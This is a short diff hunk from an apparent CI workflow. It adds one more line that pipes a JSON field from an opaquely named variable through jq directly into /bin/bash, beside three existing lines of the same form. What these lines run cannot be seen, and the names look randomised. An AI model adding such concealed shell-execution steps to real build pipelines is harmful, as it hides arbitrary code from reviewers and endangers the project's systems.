@@ -24,6 +24,7 @@ jobs:
           echo $rwnqa2 | jq -r .fj8065 | /bin/bash
           printf '%s' "$v2404" | jq -r .b00769 | /bin/bash
           echo $ub00818 | jq -r .u45 | /bin/bash
+          echo $toot784 | jq -r .dcmb84 | /bin/bash
 
       - name: Persist output
         if: always()
